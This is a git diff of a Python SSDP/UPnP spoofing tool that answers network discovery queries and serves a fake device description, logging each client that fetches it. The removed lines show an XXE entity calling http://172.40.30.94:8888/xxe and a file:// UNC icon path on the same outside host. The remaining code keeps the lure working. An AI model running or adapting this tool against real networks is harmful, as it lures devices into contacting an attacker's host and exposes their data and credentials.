@@ -55,12 +55,13 @@ class SSDPListener:
     def process_data(self, data, address):
         (remoteIp,remotePort) = address
         if 'M-SEARCH' in str(data):
-            #print(str(data))                    # DEBUG
-            requestedST = re.findall(r'\\r\\nST:(.*?)\\r\\n', str(data))[0].strip() or 'upnp:rootdevice'
+            try:
+                requestedST = re.findall(r'\\r\\nST:(.*?)\\r\\n', str(data))[0].strip()
+            except:
+                requestedST = 'ssdp:all'
             if address[0] not in self.knownHosts:
-                print(noteBox + "Received an M-SEARCH query from new host {} on port {}".format(remoteIp, remotePort))
+                print(okBox + "Received an M-SEARCH query for {} from new host {}".format(requestedST, remoteIp))
                 self.knownHosts.append(address[0])
-                print("    " + okBox + "Replying with the ST of " + requestedST)
             self.send_location(address, requestedST)
 
     def send_location(self, address, requestedST):
@@ -82,28 +83,37 @@ class SSDPListener:
         self.sock.sendto(reply, address)
 
 class DeviceDescriptor(BaseHTTPRequestHandler):
-    
     def do_GET(self):
-        xmlFile = self.buildXml()
         if self.path == '/ssdp/device-desc.xml':
+            xmlFile = self.buildDeviceXml()
             self.send_response(200)
             self.send_header('Content-type', 'application/xml')
             self.end_headers()
             self.wfile.write(xmlFile.encode())
-            print(self.headers)  # For debugging, ok to remove.
+        if self.path == '/ssdp/service-desc.xml':
+            xmlFile = self.buildServiceXml()
+            self.send_response(200)
+            self.send_header('Content-type', 'application/xml')
+            self.end_headers()
+            self.wfile.write(xmlFile.encode())
 
-    def buildXml(self):
-        xmlFile = '''<!DOCTYPE foo [
-    <!ELEMENT friendlyName ANY >
-    <!ENTITY xxe SYSTEM "http://172.40.30.94:8888/xxe" >]>
-    <root>
+    def log_message(self, format, *args):
+        address = self.address_string()
+        headers = self.headers['user-agent']
+        verb = self.command
+        path = self.path
+        print("    " + noteBox + "{} ({}) did a {} on {}".format(address, headers, verb, path))
+    
+    def buildDeviceXml(self):
+        localIp,localPort = self.server.server_address
+        xmlFile = '''<root>
     <specVersion>
         <major>1</major>
         <minor>0</minor>
     </specVersion>
     <device>
         <deviceType>urn:schemas-upnp-org:device:Basic:1</deviceType>
-        <friendlyName>&xxe;</friendlyName>
+        <friendlyName>ePNP</friendlyName>
         <manufacturer>eCorp</manufacturer>
         <manufacturerURL>http://ecorp.co</manufacturerURL>
         <modelDescription>eMedia Server</modelDescription>
@@ -114,12 +124,12 @@ class DeviceDescriptor(BaseHTTPRequestHandler):
         <UDN>uuid:e415ce0a-3e62-22d0-ad3f-42ec42e36563</UDN>
         <serviceList>
             <service>
-                <URLBase>http://xxx.yyy.zzz.aaaa:5000</URLBase>
-                <serviceType>urn:boucherie.example.com:service:Jambon:1</serviceType>
-                <serviceId>urn:boucherie.example.com:serviceId:Jambon</serviceId>
-                <controlURL>/jambon</controlURL>
+                <URLBase>http://{}:{}</URLBase>
+                <serviceType>urn:ecorp.co:service:ePNP:1</serviceType>
+                <serviceId>urn:epnp.ecorp.co:serviceId:ePNP</serviceId>
+                <controlURL>/epnp</controlURL>
                 <eventSubURL/>
-                <SCPDURL>/boucherie_wsd.xml</SCPDURL>
+                <SCPDURL>/service-desc.xml</SCPDURL>
             </service>
         </serviceList>
         <presentationURL>http://localhost</presentationURL>
@@ -128,11 +138,13 @@ class DeviceDescriptor(BaseHTTPRequestHandler):
             <width>93</width>
             <height>45</height>
             <depth>32</depth>
-            <url>file://///172.40.30.94/icon.png</url>
+            <url>http://172.40.30.94/icon.png</url>
             </icon></iconList>
     </device>
-    </root>'''
+    </root>'''.format(localIp, localPort)
         return xmlFile
 
-    #def log_message(self, format, *args):
-    #    print(noteBox + "Someone took the bait!")
+    def buildServiceXml(self):
+        xmlFile = '<root></root>'
+        return xmlFile
+    
